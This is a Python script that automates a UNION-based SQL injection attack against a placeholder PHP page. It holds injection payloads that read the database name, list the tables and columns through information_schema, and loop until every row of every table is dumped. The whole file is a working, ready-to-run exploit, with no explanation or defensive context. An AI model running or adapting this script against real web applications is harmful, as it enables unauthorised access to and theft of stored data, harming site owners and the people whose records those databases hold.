import requests

url = "http://example.com/vulnerable_page.php?id="

# SQL payloads
payload_db = "' AND 1=0 UNION SELECT 1, database() -- -"
payload_tables = "' AND 1=0 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() LIMIT %d,1 -- -"
payload_columns = "' AND 1=0 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='%s' LIMIT %d,1 -- -"
payload_data = "' AND 1=0 UNION SELECT 1, %s FROM %s LIMIT %d,1 -- -"

def send_request(payload):
    r = requests.get(url + payload)
    return r.text

def extract_data(text):
    start = text.find('<pre>') + 5
    end = text.find('</pre>')
    return text[start:end]

def get_database():
    response = send_request(payload_db)
    db_name = extract_data(response)
    return db_name

def get_tables():
    tables = []
    i = 0
    while True:
        response = send_request(payload_tables % i)
        table_name = extract_data(response)
        if table_name:
            tables.append(table_name)
            i += 1
        else:
            break
    return tables

def get_columns(table):
    columns = []
    i = 0
    while True:
        response = send_request(payload_columns % (table, i))
        column_name = extract_data(response)
        if column_name:
            columns.append(column_name)
            i += 1
        else:
            break
    return columns

def dump_data(table, columns):
    data = []
    i = 0
    while True:
        row = []
        for column in columns:
            response = send_request(payload_data % (column, table, i))
            cell_data = extract_data(response)
            if cell_data:
                row.append(cell_data)
            else:
                return data
        data.append(row)
        i += 1

# Main execution
if __name__ == "__main__":
    print("Extracting database name...")
    db_name = get_database()
    print("Database:", db_name)

    print("Extracting tables...")
    tables = get_tables()
    print("Tables:", tables)

    for table in tables:
        print("Extracting columns for table:", table)
        columns = get_columns(table)
        print("Columns:", columns)

        print("Dumping data from table:", table)
        data = dump_data(table, columns)
        for row in data:
            print(row)
